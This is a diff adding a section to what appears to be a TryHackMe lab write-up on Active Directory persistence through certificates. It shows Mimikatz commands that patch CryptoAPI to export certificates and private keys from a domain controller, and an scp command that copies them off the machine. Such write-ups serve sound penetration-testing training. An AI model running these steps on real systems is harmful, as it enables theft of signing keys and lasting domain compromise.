@@ -98,6 +98,29 @@ SILVER
 
 ### Persistence through Certificates
 
+We ssh to THMDC with our Administrator account. Now we can export the certificates using Mimikatz. Making sure to patch it so we can export the keys.
+
+```cmd
+crypto::certificates /systemstore:local_machine 
+privilege::debug 
+crypto::capi 
+crypto::cng
+
+crypto::certificates /systemstore:local_machine /export 
+```
+
+PATCH
+
+EXPORT
+
+Now we can transfer the certificates to our machine.
+
+```cmd
+scp -r Administrator@thmdc.za.tryhackme.loc:C:/Users/Administrator.TRYHACKME/Kevinovitz .
+```
+
+TRANSFER
+
 1. What key is used to sign certificates to prove their authenticity?
 
 
